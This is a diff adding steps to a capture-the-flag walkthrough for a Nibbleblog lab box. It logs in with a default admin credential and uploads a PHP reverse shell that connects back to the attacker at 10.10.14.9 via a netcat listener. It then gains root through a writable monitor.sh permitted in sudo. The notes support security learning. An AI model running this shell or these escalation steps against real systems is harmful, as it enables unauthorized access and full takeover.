@@ -153,3 +153,41 @@ admin.php  COPYRIGHT.txt  index.php  languages    plugins      themes
 - Navigating to http://10.10.10.75/nibbleblog/admin.php we see the admin login panel
 ![[Pasted image 20241123154735.png]]
 - The default password for Nibbleblog is admin:nibbles
+- After logging into the admin panel 
+- activate the My Image plugin
+- Nibbleblog runs on php so we grab a php reverse shell
+- from revshells https://www.revshells.com/
+```bash
+<?php
+$sock=fsockopen("10.10.14.9",42069);exec("/bin/sh -i <&3 >&3 2>&3");
+?>
+```
+- start nc listener 
+	- `nc -lnvp 42069`
+- upload with the my image plugin @ 
+	- `http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image`
+- navigate to the image location
+	- `http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php`
+	- nc should grab the shell
+- `cd /home/nibbler`
+- `cat user.txt`
+
+- sudo -l reveals that /home/nibbler/personal/stuff
+
+- `unzip personal.zip`
+- `cd personal`
+- `cd stuff`
+- wipe contents from monitor.sh
+- add #!/bin/bash to file
+```bash
+#!/bin/bash
+bash
+```
+- run `sudo /home/nibbler/personal/stuff/monitor.sh`
+- cd to #
+- `cat root.txt`
+
+
+
+
+
